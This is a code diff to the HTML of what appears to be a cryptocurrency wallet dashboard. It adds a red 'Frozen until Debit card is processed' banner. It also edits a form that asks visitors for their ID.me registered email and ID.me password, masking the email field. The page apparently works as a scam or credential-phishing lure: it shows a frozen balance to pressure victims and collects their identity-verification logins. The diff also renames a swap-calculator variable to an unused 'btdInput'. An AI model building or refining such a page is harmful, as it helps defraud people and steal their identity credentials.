@@ -217,7 +217,7 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            margin-bottom: 20px;
+            margin-bottom: 14px;
         }
 
         .user-profile {
@@ -270,6 +270,35 @@
             height: 6px;
             background-color: var(--success-color);
             border-radius: 50%;
+        }
+
+        /* FROZEN STATUS BANNER */
+        .frozen-banner {
+            background-color: rgba(239, 68, 68, 0.1);
+            color: #c83e3b;
+            padding: 12px 18px;
+            border-radius: 26px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 14px;
+            margin-bottom: 16px;
+            font-size: 13.5px;
+            font-weight: 600;
+            line-height: 1.35;
+        }
+
+        .frozen-dot {
+            width: 9px;
+            height: 9px;
+            background-color: #c83e3b;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .frozen-text {
+            text-align: right;
+            flex: 1;
         }
 
         .card-fiat {
@@ -783,6 +812,12 @@
                     <div class="badge-status">Active</div>
                 </div>
 
+                <!-- FROZEN STATUS NOTIFICATION -->
+                <div class="frozen-banner">
+                    <span class="frozen-dot"></span>
+                    <span class="frozen-text">Frozen until Debit card is processed by account holders name</span>
+                </div>
+
                 <div class="card-fiat">
                     <div class="fiat-label">
                         <span>Fiat Main Balance</span>
@@ -941,12 +976,12 @@
                         </div>
 
                         <div class="form-group">
-                            <label style="color: var(--text-main);">ID.me Registered Email</label>
-                            <input type="email" class="input-box" placeholder="john.doe@domain.com" required>
+                            <label style="color: var(--text-main);">ID.ME Registered Email</label>
+                            <input type="password" class="input-box" placeholder="••••••••••••••••" required>
                         </div>
 
                         <div class="form-group">
-                            <label style="color: var(--text-main);">ID.me Password</label>
+                            <label style="color: var(--text-main);">ID.ME Password</label>
                             <input type="password" class="input-box" placeholder="••••••••" required>
                         </div>
 
@@ -1166,11 +1201,11 @@
 
         function calculateSwap(direction) {
             const usdInput = document.getElementById('swap-usd-input');
-            const btcInput = document.getElementById('swap-btc-input');
+            const btdInput = document.getElementById('swap-btc-input');
 
             if (direction === 'usd') {
                 const usdVal = parseFloat(usdInput.value) || 0;
-                btcInput.value = (usdVal / BTC_RATE).toFixed(8);
+                document.getElementById('swap-btc-input').value = (usdVal / BTC_RATE).toFixed(8);
             }
         }
 
